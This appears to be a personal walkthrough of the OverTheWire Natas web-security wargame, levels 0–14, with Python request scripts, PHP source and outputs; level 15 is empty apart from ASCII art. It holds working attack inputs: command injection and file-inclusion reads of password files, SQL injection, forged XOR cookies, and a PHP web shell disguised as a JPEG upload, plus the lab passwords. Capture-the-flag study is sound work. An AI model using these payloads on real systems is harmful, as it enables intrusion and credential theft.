# Natas

https://overthewire.org/wargames/natas/

> Natas teaches the basics of serverside web-security.

> Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

> Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

> Start here:

> Username: natas0
> 
> Password: natas0
> 
> URL:      http://natas0.natas.labs.overthewire.org

## NatasX
```python
def natasX(x, pwd, endpoint="", headers={}, cookies={}, data={}):
    url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
    username = f"natas{x}"

    r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data)

    return r
 ```

## Natas0
https://overthewire.org/wargames/natas/natas0.html

> Natas Level 0

> Username: natas0

> Password: natas0

> URL:      http://natas0.natas.labs.overthewire.org

```python
print(natasX.natasX(0,"natas0").text)
```

**Output**

```html
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
</div>
```

## Natas1
https://overthewire.org/wargames/natas/natas1.html

>Natas Level 0 → Level 1

>Username: natas1

>URL:      http://natas1.natas.labs.overthewire.org



```python
print(natasX.natasX(1,"gtVrDuiDfck831PqWsLEZy5gyDz1clto").text)
```

**Output**

```html
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
</div>
</body>
```

## Natas2
https://overthewire.org/wargames/natas/natas2.html

> Natas Level 1 → Level 2

> Username: natas2

> URL:      http://natas2.natas.labs.overthewire.org

```python
natas = natasX
# print(natas.natasX(2,"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi").text)
print(natas.natasX(2,"ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi","files/users.txt").text)
```

**Output**

```text
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Natas3
https://overthewire.org/wargames/natas/natas3.html

> Natas Level 2 → Level 3

> Username: natas3

> URL:      http://natas3.natas.labs.overthewire.org

```python
natas = natasX

# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14").text)
# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/robots.txt").text)
# print(natas.natasX(3,"sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/s3cr3t/").text)
print(natas.natasX(3, "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14", "/s3cr3t/users.txt").text)
```


**Output**

```html
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

## Natas4
https://overthewire.org/wargames/natas/natas4.html

> Natas Level 3 → Level 4

> Username: natas4

> URL:      http://natas4.natas.labs.overthewire.org

```python
# print(natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ").text)
print(natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ", "", {'referer': "http://natas5.natas.labs.overthewire.org/"}).text)
```

**Output**

```html
<div id="content">

Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

## Natas5
https://overthewire.org/wargames/natas/natas5.html

> Natas Level 4 → Level 5

> Username: natas5

> URL:      http://natas5.natas.labs.overthewire.org

```python
print(natas.natasX(5, "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq", cookies={'loggedin': '1'}).text)
```

**Output**

```html
<div id="content">
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
</body>
```

## Natas6
https://overthewire.org/wargames/natas/natas6.html

> Natas Level 5 → Level 6

> Username: natas6

> URL:      http://natas6.natas.labs.overthewire.org

**Searchbox Source Code**
```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
```

```python
natas = natasX
# print(natas.natasX(6, "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1").text)
print(natas.natasX(6, "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1", endpoint="/includes/secret.inc").text)
# Enter "FOEIUWGHFEEUHOFUOIU" into the Searchbox it will result in "natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
```

**Output**

```html
<div id="content">

Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
<form method="post">
Input secret: <input name="secret"><br>
<input type="submit" name="submit">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

## Natas7
https://overthewire.org/wargames/natas/natas7.html

> Natas Level 6 → Level 7

> Username: natas7

> URL:      http://natas7.natas.labs.overthewire.org

```python
# print(natas.natasX(7, "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9").text)
print(natas.natasX(7, "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9", endpoint="index.php?page=/etc/natas_webpass/natas8").text)
```

**Output**

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

## Natas8
https://overthewire.org/wargames/natas/natas8.html

> Natas Level 7 → Level 8

> Username: natas8

> URL:      http://natas8.natas.labs.overthewire.org

**Searchbox Source Code**
```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
```
Function in php to decode $encodedSecret
```php
<?php
function decode($s){
	return base64_decode(strrev(hex2bin($s)));
}

echo decode("3d3d516343746d4d6d6c315669563362");
?>
```
Will result "oubWYf2kBq"
<br>

```python
natas = natasX

print(natas.natasX(8, "DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe").text)
```

**Output**

```html
<div id="content">

Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
<form method="post">
Input secret: <input name="secret"><br>
<input type="submit" name="submit">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

## Natas9
https://overthewire.org/wargames/natas/natas9.html

> Natas Level 8 → Level 9

> Username: natas9

> URL:      http://natas9.natas.labs.overthewire.org

```python
natas = natasX

# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl").text)
# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; ls -a ;").text)
# print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; ls -a cd ..;").text)
print(natas.natasX(9, "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl", endpoint="/?needle=; cat cd ../../../../../etc/natas_webpass/natas10 ;").text)
```

**Output**

```html
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

## Natas10
https://overthewire.org/wargames/natas/natas10.html

> Natas Level 9 → Level 10

> Username: natas10

> URL:      http://natas10.natas.labs.overthewire.org

```python
natas = natasX

# print(natas.natasX(10, "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu").text)
print(natas.natasX(10, "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu", endpoint="/?needle=u /etc/natas_webpass/natas11").text)
```

**Output**

```html
Output:
<pre>
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
dictionary.txt:August
dictionary.txt:August's
dictionary.txt:Augusts
dictionary.txt:Celsius
dictionary.txt:Celsiuses
dictionary.txt:Dutch
dictionary.txt:Dutch's
dictionary.txt:Europe
<!-- [...] -->
</pre>
```

## Natas11
https://overthewire.org/wargames/natas/natas11.html

> Natas Level 10 → Level 11

> Username: natas11

> URL:      http://natas11.natas.labs.overthewire.org

**InputForm Source Code**
```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

**Written PHP Code to find the key**
<br>
[Kasiski examination](https://en.wikipedia.org/wiki/Kasiski_examination#A_string-based_attack)

```php
<pre>
<?php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#aaaaaa");

function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    	$outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function saveData($d) {
    return base64_encode(xor_encrypt(json_encode($d)));
}

function decodeData($d) {
	return xor_encrypt(base64_decode($d));
}

function showEveryChar($d, $e) {
	$text = $e;
    $cookie = $d;
    $result = '';
    
	for($i=0;$i<strlen($cookie);$i++) {
    	echo ord($cookie[$i]) . "\t" . $text[$i] . "<br>";
    }
}

# xor_encrypt works in both ways for decoding and encoding
# echo decodeData(saveData($defaultdata));

#"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSFlkrEBZZaAw=" -> array( "showpassword"=>"no", "bgcolor"=>"#aaaaaa");
#echo base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSFlkrEBZZaAw=") . "<br><br>";

#showEveryChar(base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSFlkrEBZZaAw="), json_encode($defaultdata));

#22	a
#89	a
#43	a
#16	a
#22	a
#89	a
#repeat of 22 and 89
#key = qw8J

#echo xor_encrypt(json_encode($defaultdata)) . "<br><br>";

#echo saveData($defaultdata) . "<br>";
#echo decodeData("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSFFkpEhZbaAw=");

$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#caccac");

echo saveData($defaultdata);
#ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVFsrEhRZKVMK
?>
</pre>
```

```python
natas = natasX

#print(natas.natasX(11, "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK").text)
print(natas.natasX(11, "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK", cookies={"data": "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVFsrEhRZKVMK"}).text)
```

**Output**

```html
<div id="content">
<body style="background: #caccac;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>
<form>
Background color: <input name=bgcolor value="#caccac">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

## Natas12
https://overthewire.org/wargames/natas/natas12.html

> Natas Level 11 → Level 12

> Username: natas12

> URL:      http://natas12.natas.labs.overthewire.org


**FileUpdload Source Code**
```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
}
```

```php
echo "<?php echo system(\"cat /etc/natas_webpass/natas13\"); ?>" > natas12.jpg
```
CI no phyton Code is needed

**Output**

```html
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

## Natas13
https://overthewire.org/wargames/natas/natas13.html

> Natas Level 12 → Level 13

> Username: natas13

> URL:      http://natas13.natas.labs.overthewire.org

**FileUpdload Source Code**
```php
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
}
```

```php
echo "<?php echo system(\"cat /etc/natas_webpass/natas14\"); ?>" > natas13.jpg
hexeditor -b natas13.jpg
```

**Creating an fake jpg natas13.jpg**

```
00000000  3C 3F 70 68  70 20 65 63   68 6F 20 73  79 73 74 65                                             <?php echo syste
00000010  6D 28 2F 65  74 63 2F 6E   61 74 61 73  5F 77 65 62                                             m(/etc/natas_web
00000020  70 61 73 73  2F 6E 61 74   61 73 31 34  29 3B 20 3F                                             pass/natas14); ?
00000030  3E 0A                                                                                           >.
```

```
00000000  FF D8 FF DB  3C 3F 70 68   70 20 65 63  68 6F 20 73                                             ....<?php echo s
00000010  79 73 74 65  6D 28 2F 65   74 63 2F 6E  61 74 61 73                                             ystem(/etc/natas
00000020  5F 77 65 62  70 61 73 73   2F 6E 61 74  61 73 31 34                                             _webpass/natas14
00000030  29 3B 20 3F  3E 0A                                                                              ); ?>.
```
**"FF D8 FF DB" needs to be added at the start**

CI no phyton Code is needed

**Output**

```html
����Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

## Natas14
https://overthewire.org/wargames/natas/natas14.html

> Natas Level 13 → Level 14

> Username: natas14

> URL:      http://natas14.natas.labs.overthewire.org

```python
import natasX

natas = natasX

print(natas.natasX(14, "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1", endpoint="index.php?debug=yes", data={"username": "hello\" OR \"natas12", "password": "1234\" OR 1=1 OR \"test"}).text)
```

**Output**

```html
<div id="content">
Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```


## Natas15
https://overthewire.org/wargames/natas/natas15.html

> Natas Level 14 → Level 15

> Username: natas15

> URL:      http://natas15.natas.labs.overthewire.org

```python
```

**Output**

```html
```

<br>

```php
<?php
echo "goodbye";
?>
                                             ..--:.                                       
                                           .: -.  .=-:                                    
                                     .....:. +*#*+*%@#+                                   
                               ....::===---=+-:. *:  +@%.                                 
                         .   .. -++--.---:--##=.:==  :*%#                                 
            :::::..-:.::..+#*:-+%%---:    .@*    :+ -*@-@:.                               
          .-= -=++=--:+  =@##-+-.**-:.... =@+----:-+#@%:%..-                              
         .-:.+#=  --*#@-  =++*=.-++#@+==--==+-=-::=*+@@-**:*=.                            
        .:--+@%+**.   .@%+----#@@%*@@%**%@%*+#+:--: :%@*-%=+*.=                           
       :: =*@#-  =*+*#%%%@@@@#*%%+::=:::..:+- -+:=*++#*%##=-+**+                          
       =+  -. =#@%#=+*#*-=#@*.. *+=+-:.  ::==  @%%@@@--=%@*::+@*+-                        
        +@-:=##@==-::*=++:-*.-:=+---::+#::--:+**%.*@#.:-*@@+-=#=-:*:                      
        :@#**=@*:=   ::.:+@@- :::--*@#-.:- -+*=-::=@:=  %@@@@*--=-*+=:                    
         ##**#==+*=:=+#+--@*-=:-+=-:..-****#*+=-=#@-=- +%#@@%%##+=*#:+=                   
         .=* + .=-=:-+.:-+-   .:-+*+===+#+-=*#*+@=-+#.==#+%#+-  ..=%*+*+                  
          -.  = .:-::--.           :-+**##@@=::*=-*%=:#=#=*#=-:::--=#%#+-                 
          ##-::=*#%@=               .::-+%@*+++++=@%-=#*+#-%*-.   ..-#@==-                
      .:-*+=*+=**#*.                  ......-++=:-==+=-.:%.+@#+--=+++-#%:+-               
     -:-=#.---#%@*:                           :-=+=-:.:-*= =%+*++-=-+@=@====-+            
     ==:*:- =+-%::.                            ..-+%%%%%+=+%%**=++: .-%%@%---==           
     :+ * :=.-@-                               ..--*##@@+-%@*-:.:::====@@@#*#*#           
     -+ .+*=+@@               ..-===---:.     ...::-==+%@. %@*=:+=+#+*-+@%*+:-*#          
      %*==+#*@+             *@@@#*+:.. .:----.--:.::=--=@*.@#=++#*+#=.*+#=-:--=@          
      # :%=-#%   -=+#:     =*+==++*++====-=======-   ::=@*+++==-++#%= +%%%#-: .@=.        
      %   %#%.:-++***#.   -*-.=*#%#@+. .-####+:::::  .:=+%-==:::*-%@:.*-+##% .:%==:       
      =*=+-%#. ===*##%#   =-:..+@##*=.. -+#@#+        .-+=#==-:::.+@++*-::-*=--%= #       
        =*#@#=+#*=::*%+   -:.  .=::..:--==*+:         .-++*..=%#*- -+#@=--.#=-=@. -:      
        .#--##%@=  -+-   ...                          .:==== -%@@@. --+#%*%=:+%@-:--      
        .%--=@-*==-: :                              -..:==--=+%@@-*%###%**%**-#%--:+.     
         :*-=@    . :   .:.                        =-...#=*+**##+ ##=.: .=%#-:-%+::-*     
          .+*@      :   :.     .                  -:.   -=::-==:=%%+-: ..-@+::--#%%@#     
            *%     .    . ......-                :.     .-.:.=..-.  .:  -#+#*+==*%#:=.    
             .     :  .-- :----++              .     . ::-.=:= ==+  .-=%@*-:==##-:.=.     
              :     :.-+==#*##+*-                   .:.:.=:-:=:     .+@@@#=-+%*:--=       
              ::     ....-==*=:.                    :: ::::-=..%=-=+@@@#-=#*%@#+-:        
               :.       : . :                     . .: --:=.- =*-..:=@@@--::-%#           
               .:      .:--:-:-..                 : :::-=:--.:#=     %@@+*+*-@:           
                :     -:*+-=*++==+==.            .: :.=-.-.-.%+-     -@@--:=#:            
                 .   :*-           .             .. :::-::--@%==     .#%*--: +            
                 .    .-. :+-=+=-:              ... .--.--+=%+:      .+:#=-: .-           
                  :    :-*++====-=-.                . -==:.:+        -:.:**-  =           
                   :   ..                           .:.   .+         - ..-=*  *           
                   .                                      +         ..    ..+#.           
                    :                       :::          +          :        -:           
                     :   .:::::-:..      :=+.           =.                    --          
                      :: .-:---:.....-=+*+-            ::                .::---#:         
                        .:--=====+=+++=--             .-          .-=+#%@@@@@@*-          
                               :.----:..              =      .-+#%@@@@@@@#+-.             
                                -::--:.              .:   -*%@@@@@@@@#=:                  
                                 -..::::              :+%@@@@@@@@%+:                      
                                  :               .=#@@@@@@@@@*=.                         
                                  :            .=%@@@@@@@@%+:                             
                                   =        :+%@@@@@%*+=:                                 
                                    +    :+%@@%*=:.                                       
                                    .+:+%@%+:                                             
                                     -#+-                                                 
```
